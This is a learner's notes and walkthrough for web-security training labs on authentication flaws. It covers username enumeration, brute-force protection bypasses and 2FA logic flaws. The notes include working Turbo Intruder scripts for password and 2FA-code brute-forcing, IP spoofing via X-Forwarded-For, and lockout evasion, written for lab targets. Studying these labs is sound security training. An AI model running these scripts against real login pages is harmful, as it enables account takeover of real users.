# Authentication vulnerabilities
- Conceptually, authentication vulnerabilities are easy to understand. 
- However, they are usually critical because of the clear relationship between authentication and security.
- Authentication vulnerabilities can allow attackers to gain access to sensitive data and functionality. 
- They also expose additional attack surface for further exploits. 
- For this reason, it's important to learn how to identify and exploit authentication vulnerabilities, and how to bypass common protection measures.

# Things to learn
- The most common authentication mechanisms used by websites.
- Potential vulnerabilities in these mechanisms.
- Inherent vulnerabilities in different authentication mechanisms.
- Typical vulnerabilities that are introduced by their improper implementation.
- How you can make your own authentication mechanisms as robust as possible.

# What is authentication?
- Authentication is the process of verifying the identity of a user or client. 
- Websites are potentially exposed to anyone who is connected to the internet. 
- This makes robust authentication mechanisms integral to effective web security.
- There are three main types of authentication:
    - Something you know, such as a password or the answer to a security question. These are sometimes called "knowledge factors".
    - Something you have, This is a physical object such as a mobile phone or security token. These are sometimes called "possession factors".
    - Something you are or do. For example, your biometrics or patterns of behavior. These are sometimes called "inherence factors".
- Authentication mechanisms rely on a range of technologies to verify one or more of these factors.

# What is the difference between authentication and authorization?
- Authentication is the process of verifying that a user is who they claim to be. 
- Authorization involves verifying whether a user is allowed to do something.
- For example, authentication determines whether someone attempting to access a website with the username Carlos123 really is the same person who created the account.
- Once Carlos123 is authenticated, their permissions determine what they are authorized to do. 
- For example, they may be authorized to access personal information about other users, or perform actions such as deleting another user's account.

# How do authentication vulnerabilities arise?
- Most vulnerabilities in authentication mechanisms occur in one of two ways:
- The authentication mechanisms are weak because they fail to adequately protect against brute-force attacks.
- Logic flaws or poor coding in the implementation allow the authentication mechanisms to be bypassed entirely by an attacker. This is sometimes called "broken authentication".
- In many areas of web development, logic flaws cause the website to behave unexpectedly, which may or may not be a security issue. 
- However, as authentication is so critical to security, it's very likely that flawed authentication logic exposes the website to security issues.

- What is the impact of vulnerable authentication?
- The impact of authentication vulnerabilities can be severe. 
- If an attacker bypasses authentication or brute-forces their way into another user's account, they have access to all the data and functionality that the compromised account has. 
- If they are able to compromise a high-privileged account, such as a system administrator, they could take full control over the entire application and potentially gain access to internal infrastructure.
- Even compromising a low-privileged account might still grant an attacker access to data that they otherwise shouldn't have, such as commercially sensitive business information. 
- Even if the account does not have access to any sensitive data, it might still allow the attacker to access additional pages, which provide a further attack surface. 
- Often, high-severity attacks are not possible from publicly accessible pages, but they may be possible from an internal page.

# Vulnerabilities in authentication mechanisms
- A website's authentication system usually consists of several distinct mechanisms where vulnerabilities may occur. 
- Some vulnerabilities are applicable across all of these contexts. 
- Others are more specific to the functionality provided.
- We will look more closely at some of the most common vulnerabilities in the following areas:
- Vulnerabilities in password-based login LABS
- Vulnerabilities in multi-factor authentication LABS
- Vulnerabilities in other authentication mechanisms LABS

# Vulnerabilities in password-based login
- For websites that adopt a password-based login process, users either register for an account themselves or they are assigned an account by an administrator. 
- This account is associated with a unique username and a secret password, which the user enters in a login form to authenticate themselves.
- In this scenario, the fact that they know the secret password is taken as sufficient proof of the user's identity. 
- This means that the security of the website is compromised if an attacker is able to either obtain or guess the login credentials of another user.
- This can be achieved in a number of ways. 
- The following sections show how an attacker can use brute-force attacks, and some of the flaws in brute-force protection. 
- You'll also learn about the vulnerabilities in HTTP basic authentication.

- Brute-force attacks
- A brute-force attack is when an attacker uses a system of trial and error to guess valid user credentials. 
- These attacks are typically automated using wordlists of usernames and passwords. 
- Automating this process, especially using dedicated tools, potentially enables an attacker to make vast numbers of login attempts at high speed.
- Brute-forcing is not always just a case of making completely random guesses at usernames and passwords. 
- By also using basic logic or publicly available knowledge, attackers can fine-tune brute-force attacks to make much more educated guesses. 
- This considerably increases the efficiency of such attacks. 
- Websites that rely on password-based login as their sole method of authenticating users can be highly vulnerable if they do not implement sufficient brute-force protection.

1. # Brute-forcing usernames
- Usernames are especially easy to guess if they conform to a recognizable pattern, such as an email address. 
- For example, it is very common to see business logins in the format firstname.lastname@somecompany.com. 
- However, even if there is no obvious pattern, sometimes even high-privileged accounts are created using predictable usernames, such as admin or administrator.
- During auditing, check whether the website discloses potential usernames publicly. 
- For example, are you able to access user profiles without logging in? Even if the actual content of the profiles is hidden, the name used in the profile is sometimes the same as the login username. 
- You should also check HTTP responses to see if any email addresses are disclosed. 
- Occasionally, responses contain email addresses of high-privileged users, such as administrators or IT support.

2. # Brute-forcing passwords
- Passwords can similarly be brute-forced, with the difficulty varying based on the strength of the password. 
- Many websites adopt some form of password policy, which forces users to create high-entropy passwords that are, theoretically at least, harder to crack using brute-force alone. 
- This typically involves enforcing passwords with:
    - A minimum number of characters
    - A mixture of lower and uppercase letters
    - At least one special character
- However, while high-entropy passwords are difficult for computers alone to crack, we can use a basic knowledge of human behavior to exploit the vulnerabilities that users unwittingly introduce to this system. 
- Rather than creating a strong password with a random combination of characters, users often take a password that they can remember and try to crowbar it into fitting the password policy. 
- For example, if mypassword is not allowed, users may try something like Mypassword1! or Myp4$$w0rd instead.
- In cases where the policy requires users to change their passwords on a regular basis, it is also common for users to just make minor, predictable changes to their preferred password. 
- For example, Mypassword1! becomes Mypassword1? or Mypassword2!.
- This knowledge of likely credentials and predictable patterns means that brute-force attacks can often be much more sophisticated, and therefore effective, than simply iterating through every possible combination of characters.

# Username enumeration
- Username enumeration is when an attacker is able to observe changes in the website's behavior in order to identify whether a given username is valid.
- Username enumeration typically occurs either on the login page, for example, when you enter a valid username but an incorrect password, or on registration forms when you enter a username that is already taken. 
- This greatly reduces the time and effort required to brute-force a login because the attacker is able to quickly generate a shortlist of valid usernames.
- While attempting to brute-force a login page, you should pay particular attention to any differences in:
    - Status codes: During a brute-force attack, the returned HTTP status code is likely to be the same for the vast majority of guesses because most of them will be wrong. 
    - If a guess returns a different status code, this is a strong indication that the username was correct. 
    - It is best practice for websites to always return the same status code regardless of the outcome, but this practice is not always followed.
    - Error messages: Sometimes the returned error message is different depending on whether both the username AND password are incorrect or only the password was incorrect. 
    - It is best practice for websites to use identical, generic messages in both cases, but small typing errors sometimes creep in. 
    - Just one character out of place makes the two messages distinct, even in cases where the character is not visible on the rendered page.
    - Response times: If most of the requests were handled with a similar response time, any that deviate from this suggest that something different was happening behind the scenes. 
    - This is another indication that the guessed username might be correct. 
    - For example, a website might only check whether the password is correct if the username is valid. This extra step might cause a slight increase in the response time. 
    - This may be subtle, but an attacker can make this delay more obvious by entering an excessively long password that the website takes noticeably longer to handle.

# Lab: Username enumeration via different responses
- This lab is vulnerable to username enumeration and password brute-force attacks. 
- It has an account with a predictable username and password, which can be found in the following wordlists:
- Candidate usernames
- Candidate passwords
- To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

# My Solution
- I sent the log in request to burp turbo intruder and I Highlighted the username and used the following code
```
ef queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    for word in open('/home/kali/authenticationlabusernames'):
        engine.queue(target.req, word.rstrip())


def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if req.status != 404:
        table.add(req)
```
- After I got the Username when the error message said invalid password, I sent the request to repeater and I highlighted the password and sent it to burp turbo intruder once again using the same code but now with a password list
```
ef queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    for word in open('/home/kali/authenticationlabuserpassword'):
        engine.queue(target.req, word.rstrip())


def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if req.status != 404:
        table.add(req)
```
- I got a 302 redirect on a password, I logged in with the username and password and the lab was solved

# Lab Solution
- With Burp running, investigate the login page and submit an invalid username and password.
- In Burp, go to Proxy > HTTP history and find the POST /login request. Highlight the value of the username parameter in the request and send it to Burp Intruder.
- In Burp Intruder, notice that the username parameter is automatically set as a payload position. This position is indicated by two § symbols, for example: username=§invalid-username§. Leave the password as any static value for now.
- Make sure that Sniper attack is selected.
- In the Payloads side panel, make sure that the Simple list payload type is selected.
- Under Payload configuration, paste the list of candidate usernames. Finally, click  Start attack. The attack will start in a new window.
- When the attack is finished, examine the Length column in the results table. You can click on the column header to sort the results. Notice that one of the entries is longer than the others. Compare the response to this payload with the other responses. Notice that other responses contain the message Invalid username, but this response says Incorrect password. Make a note of the username in the Payload column.
- Close the attack and go back to the Intruder tab. Click Clear §, then change the username parameter to the username you just identified. Add a payload position to the password parameter. The result should look something like this:

- username=identified-user&password=§invalid-password§
- In the Payloads side panel, clear the list of usernames and replace it with the list of candidate passwords. Click  Start attack.
- When the attack is finished, look at the Status column. Notice that each request received a response with a 200 status code except for one, which got a 302 response. This suggests that the login attempt was successful - make a note of the password in the Payload column.
- Log in using the username and password that you identified and access the user account page to solve the lab.

# My Solution
- I sent the log in request to burp turbo intruder and I Highlighted the username and used the following code
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    for word in open('/home/kali/authenticationlabusernames'):
        engine.queue(target.req, word.rstrip())


def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if req.status != 404:
        table.add(req)
```
- After I got the Username when the error message said invalid "username and password.", but one of them is missing the trailing "." , I sent the request to repeater and I highlighted the password and sent it to burp turbo intruder once again using the same code but now with a password list
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    for word in open('/home/kali/authenticationlabuserpassword'):
        engine.queue(target.req, word.rstrip())


def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if req.status != 404:
        table.add(req)
```
- I got a 302 redirect on a password, I logged in with the username and password and the lab was solved

# Lab: Username enumeration via response timing
- This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.
- Your credentials: wiener:peter
# My Solution
- I sent the request repeater and put in a valid username but wrong password
- I was blocked for 30 minutes
- I added X-Forwarded-For header and I got invalid email and password
- I sent the request to turbo intruder, and highlighted the value of the header
- I also highlighted the value of username and password.   
- I used the following code
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    i = 0
    usernames = open('/home/kali/authenticationlabusernames').read().splitlines()
    passwords = open('/home/kali/authenticationlabpassword').read().splitlines()

    for username in usernames:
        for password in passwords:
            ip = "192.168.1.%d" % (i + 1)  # increment IP for each request
            engine.queue(target.req, [ip, username, password])
            i += 1


def handleResponse(req, interesting):
    if req.status != 404:
        table.add(req)
```
- After some minuted I got 302 respose, I copied the password and logged in.

# Solution
- With Burp running, submit an invalid username and password, then send the POST /login request to Burp Repeater. 
- Experiment with different usernames and passwords. Notice that your IP will be blocked if you make too many invalid login attempts.
- Identify that the X-Forwarded-For header is supported, which allows you to spoof your IP address and bypass the IP-based brute-force protection.
- Continue experimenting with usernames and passwords. Pay particular attention to the response times. Notice that when the username is invalid, the response time is roughly the same. 
- However, when you enter a valid username (your own), the response time is increased depending on the length of the password you entered.
- Send this request to Burp Intruder and select Pitchfork attack from the attack type drop-down menu. 
- Add the X-Forwarded-For header.
- Add payload positions for the X-Forwarded-For header and the username parameter. Set the password to a very long string of characters (about 100 characters should do it).
- In the Payloads side panel, select position 1 from the Payload position drop-down list. Select the Numbers payload type. Enter the range 1 - 100 and set the step to 1. Set the max fraction digits to 0. This will be used to spoof your IP.
- Select position 2 from the Payload position drop-down list, then add the list of usernames. Start the attack.
- When the attack finishes, at the top of the dialog, click Columns and select the Response received and Response completed options. These two columns are now displayed in the results table.
- Notice that one of the response times was significantly longer than the others. Repeat this request a few times to make sure it consistently takes longer, then make a note of this username.
- Create a new Burp Intruder attack for the same request. Add the X-Forwarded-For header again and add a payload position to it. Insert the username that you just identified and add a payload position to the password parameter.
- In the Payloads side panel, add the list of numbers to payload position 1 and add the list of passwords to payload position 2. Start the attack.
- When the attack is finished, find the response with a 302 status. Make a note of this password.
- Log in using the username and password that you identified and access the user account page to solve the lab.

# Flawed brute-force protection
- It is highly likely that a brute-force attack will involve many failed guesses before the attacker successfully compromises an account. 
- Logically, brute-force protection revolves around trying to make it as tricky as possible to automate the process and slow down the rate at which an attacker can attempt logins. The two most common ways of preventing brute-force attacks are:
- Locking the account that the remote user is trying to access if they make too many failed login attempts
- Blocking the remote user's IP address if they make too many login attempts in quick succession
- Both approaches offer varying degrees of protection, but neither is invulnerable, especially if implemented using flawed logic.
- For example, you might sometimes find that your IP is blocked if you fail to log in too many times. In some implementations, the counter for the number of failed attempts resets if the IP owner logs in successfully. This means an attacker would simply have to log in to their own account every few attempts to prevent this limit from ever being reached.
- In this case, merely including your own login credentials at regular intervals throughout the wordlist is enough to render this defense virtually useless.

# Lab: Broken brute-force protection, IP block
- This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.
- Your credentials: wiener:peter
- Victim's username: carlos

# My Solution
- I sent the login request to burp turbo intruder and I use the following code
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    # Password wordlist
    passwords = open('/home/kali/authenticationlabpassword').read().splitlines()

    count = 0
    engine.queue(target.req, ["wiener", "peter"])
    for password in passwords:
        # Immediately queue wiener/peter after each carlos request
        engine.queue(target.req, ["wiener", "peter"])
        
        # Queue the carlos attempt
        engine.queue(target.req, ["carlos", password.rstrip()])
        
        


def handleResponse(req, interesting):
    if req.status != 404:
        table.add(req)
```
- I got carlos password and solved the lab

# Account locking
- One way in which websites try to prevent brute-forcing is to lock the account if certain suspicious criteria are met, usually a set number of failed login attempts. 
- Just as with normal login errors, responses from the server indicating that an account is locked can also help an attacker to enumerate usernames.

# Lab: Username enumeration via account lock
-  This lab is vulnerable to username enumeration. It uses account locking, but this contains a logic flaw. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

# My Solution
- I sent the request to burp intruder and set the %s on both the username and password
- In turbo I ran the following code
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=100,
                           requestsPerConnection=1000,
                           pipeline=False
                           )


    usernames = open('/home/kali/authenticationlabusernames').read().splitlines()
    passwords = open('/home/kali/authenticationlabpassword').read().splitlines()

    for username in usernames:
        for password in passwords:
            engine.queue(target.req, [username, password])
           


def handleResponse(req, interesting):
    if req.status != 404:
        table.add(req)
```
- When the attack complete one of the username stood out because it was locked out.
- I sent the request to repeater and send it back to the intruder the use the following code
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=10,
                           pipeline=False
                           )


 
    passwords = open('/home/kali/authenticationlabpassword').read().splitlines()

    
    for password in passwords:
        engine.queue(target.req, password)
           


def handleResponse(req, interesting):
    if req.status != 404:
        table.add(req)
```
- I filtered with the length and one of the response stood out, the response has no error message
- I waited for 1 minute and I logged in with the username and password to solve the lab

# Lab Solution
- With Burp running, investigate the login page and submit an invalid username and password. Send the POST /login request to Burp Intruder.
- Select Cluster bomb attack from the attack type drop-down menu. Add a payload position to the username parameter. Add a blank payload position to the end of the request body by clicking Add §. The result should look something like this:
```
username=§invalid-username§&password=example§§
```
- In the Payloads side panel, add the list of usernames for the first payload position. 
- For the second payload position, select the Null payloads type and choose the option to generate 5 payloads. This will effectively cause each username to be repeated 5 times. Start the attack.
- In the results, notice that the responses for one of the usernames were longer than responses when using other usernames. 
- Study the response more closely and notice that it contains a different error message: You have made too many incorrect login attempts. Make a note of this username.
- Create a new Burp Intruder attack on the POST /login request, but this time select Sniper attack from the attack type drop-down menu. Set the username parameter to the username that you just identified and add a payload position to the password parameter.
- Add the list of passwords to the payload set and create a grep extraction rule for the error message. Start the attack.
- In the results, look at the grep extract column. Notice that there are a couple of different error messages, but one of the responses did not contain any error message. Make a note of this password.
- Wait for a minute to allow the account lock to reset. Log in using the username and password that you identified and access the user account page to solve the lab.

# Countinuation
- Locking an account offers a certain amount of protection against targeted brute-forcing of a specific account. 
- However, this approach fails to adequately prevent brute-force attacks in which the attacker is just trying to gain access to any random account they can.
- For example, the following method can be used to work around this kind of protection:
- Establish a list of candidate usernames that are likely to be valid. This could be through username enumeration or simply based on a list of common usernames.
- Decide on a very small shortlist of passwords that you think at least one user is likely to have. 
- Crucially, the number of passwords you select must not exceed the number of login attempts allowed. 
- For example, if you have worked out that limit is 3 attempts, you need to pick a maximum of 3 password guesses.
- Using a tool such as Burp Intruder, try each of the selected passwords with each of the candidate usernames. 
- This way, you can attempt to brute-force every account without triggering the account lock. You only need a single user to use one of the three passwords in order to compromise an account.
- Account locking also fails to protect against credential stuffing attacks. 
- This involves using a massive dictionary of username:password pairs, composed of genuine login credentials stolen in data breaches. 
- Credential stuffing relies on the fact that many people reuse the same username and password on multiple websites and, therefore, there is a chance that some of the compromised credentials in the dictionary are also valid on the target website. 
- Account locking does not protect against credential stuffing because each username is only being attempted once. 
- Credential stuffing is particularly dangerous because it can sometimes result in the attacker compromising many different accounts with just a single automated attack

# User rate limiting
- Another way websites try to prevent brute-force attacks is through user rate limiting. 
- In this case, making too many login requests within a short period of time causes your IP address to be blocked. 
- Typically, the IP can only be unblocked in one of the following ways:
- Automatically after a certain period of time has elapsed
- Manually by an administrator
- Manually by the user after successfully completing a CAPTCHA
- User rate limiting is sometimes preferred to account locking due to being less prone to username enumeration and denial of service attacks. 
- However, it is still not completely secure. As we saw an example of in an earlier lab, there are several ways an attacker can manipulate their apparent IP in order to bypass the block.
- As the limit is based on the rate of HTTP requests sent from the user's IP address, 
- it is sometimes also possible to bypass this defense if you can work out how to guess multiple passwords with a single request

# Lab Solution
- With Burp running, investigate the login page. Notice that the POST /login request submits the login credentials in JSON format. Send this request to Burp Repeater.
- In Burp Repeater, replace the single string value of the password with an array of strings containing all of the candidate passwords. For example:
```
"username" : "carlos",
"password" : [
    "123456",
    "password",
    "qwerty"
    ...
]
```
- Send the request. This will return a 302 response.
- Right-click on this request and select Show response in browser. Copy the URL and load it in the browser. The page loads and you are logged in as carlos.
- Click My account to access Carlos's account page and solve the lab

# My Solution
- Instead of putting all the password in at once, I put them in batch by batch
- Then when I got 302
- I started checking each password out making sure the rate limit was not hit
- I got the password and solved the lab

# HTTP basic authentication
- Although fairly old, its relative simplicity and ease of implementation means you might sometimes see HTTP basic authentication being used. 
- In HTTP basic authentication, the client receives an authentication token from the server, which is constructed by concatenating the username and password, and encoding it in Base64. 
- This token is stored and managed by the browser, which automatically adds it to the Authorization header of every subsequent request as follows:
- Authorization: Basic base64(username:password)
- For a number of reasons, this is generally not considered a secure authentication method. 
- Firstly, it involves repeatedly sending the user's login credentials with every request. 
- Unless the website also implements HSTS, user credentials are open to being captured in a man-in-the-middle attack.
- In addition, implementations of HTTP basic authentication often don't support brute-force protection. - As the token consists exclusively of static values, this can leave it vulnerable to being brute-forced.
- HTTP basic authentication is also particularly vulnerable to session-related exploits, notably CSRF, against which it offers no protection on its own.
- In some cases, exploiting vulnerable HTTP basic authentication might only grant an attacker access to a seemingly uninteresting page. 
- However, in addition to providing a further attack surface, the credentials exposed in this way might be reused in other, more confidential contexts.

# Vulnerabilities in multi-factor authentication
- Many websites rely exclusively on single-factor authentication using a password to authenticate users. 
- However, some require users to prove their identity using multiple authentication factors.
- Verifying biometric factors is impractical for most websites. 
- However, it is increasingly common to see both mandatory and optional two-factor authentication (2FA) based on something you know and something you have. 
- This usually requires users to enter both a traditional password and a temporary verification code from an out-of-band physical device in their possession.

- While it is sometimes possible for an attacker to obtain a single knowledge-based factor, such as a password, being able to simultaneously obtain another factor from an out-of-band source is considerably less likely. 
- For this reason, two-factor authentication is demonstrably more secure than single-factor authentication. 
- However, as with any security measure, it is only ever as secure as its implementation. 
- Poorly implemented two-factor authentication can be beaten, or even bypassed entirely, just as single-factor authentication can.
- It is also worth noting that the full benefits of multi-factor authentication are only achieved by verifying multiple different factors. 
- Verifying the same factor in two different ways is not true two-factor authentication. 
- Email-based 2FA is one such example. Although the user has to provide a password and a verification code, accessing the code only relies on them knowing the login credentials for their email account. - 
- Therefore, the knowledge authentication factor is simply being verified twice.

# Two-factor authentication tokens
- Verification codes are usually read by the user from a physical device of some kind. 
- Many high-security websites now provide users with a dedicated device for this purpose, such as the RSA token or keypad device that you might use to access your online banking or work laptop. 
- In addition to being purpose-built for security, these dedicated devices also have the advantage of generating the verification code directly. 
- It is also common for websites to use a dedicated mobile app, such as Google Authenticator, for the same reason.
- On the other hand, some websites send verification codes to a user's mobile phone as a text message. 
- While this is technically still verifying the factor of "something you have", it is open to abuse. 
- Firstly, the code is being transmitted via SMS rather than being generated by the device itself. 
- This creates the potential for the code to be intercepted. 
- There is also a risk of SIM swapping, whereby an attacker fraudulently obtains a SIM card with the victim's phone number. 
- The attacker would then receive all SMS messages sent to the victim, including the one containing their verification code.

# Bypassing two-factor authentication
- At times, the implementation of two-factor authentication is flawed to the point where it can be bypassed entirely.
- If the user is first prompted to enter a password, and then prompted to enter a verification code on a separate page, the user is effectively in a "logged in" state before they have entered the verification code. 
- In this case, it is worth testing to see if you can directly skip to "logged-in only" pages after completing the first authentication step. 
- Occasionally, you will find that a website doesn't actually check whether or not you completed the second step before loading the page.

# Lab: 2FA simple bypass
- This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. 
- To solve the lab, access Carlos's account page.
- Your credentials: wiener:peter
- Victim's credentials carlos:montoya

# Solution
- Login with the user email and password and put in 2fa code
- Logout and login again, but browse to previous user profile
- If successful, log in with victims details and browse to the victims account profile page

# Flawed two-factor verification logic
- Sometimes flawed logic in two-factor authentication means that after a user has completed the initial login step, the website doesn't adequately verify that the same user is completing the second step.
- For example, the user logs in with their normal credentials in the first step as follows:
```
POST /login-steps/first HTTP/1.1
Host: vulnerable-website.com
...
username=carlos&password=qwerty
```
- They are then assigned a cookie that relates to their account, before being taken to the second step of the login process:
```
HTTP/1.1 200 OK
Set-Cookie: account=carlos

GET /login-steps/second HTTP/1.1
Cookie: account=carlos
```
- When submitting the verification code, the request uses this cookie to determine which account the user is trying to access:
```
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=carlos
...
verification-code=123456
```
- In this case, an attacker could log in using their own credentials but then change the value of the account cookie to any arbitrary username when submitting the verification code.
```
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=victim-user
...
verification-code=123456
```
- This is extremely dangerous if the attacker is then able to brute-force the verification code as it would allow them to log in to arbitrary users' accounts based entirely on their username. 
- They would never even need to know the user's password.

# Lab: 2FA broken logic
- This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.
- Your credentials: wiener:peter
- Victim's username: carlos
- You also have access to the email server to receive your 2FA verification code.


# My Solution
- I submitted my credentials and intercepted the request
- I intercepted the response too, I notice set-Cookie that is seeting verify=wiener
- I changed it to carlos
- Subsesequent requests were having cookie carlos instead of wiener
- But the 2fa code did not land in wiener mail
- I sent the request to burp turbo intruder and the I used the code below
```
def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           engine=Engine.BURP2
                           )

    passwords = [p.strip() for p in open('/home/kali/SecLists-master/Fuzzing/4-digits-0000-9999.txt', 'r').readlines()]
    
    for password in passwords:
        engine.queue(target.req, password)

def handleResponse(req, interesting):
    table.add(req)
```
- I got a 302 response and I copied the code and pasted it in
- The lab was solved

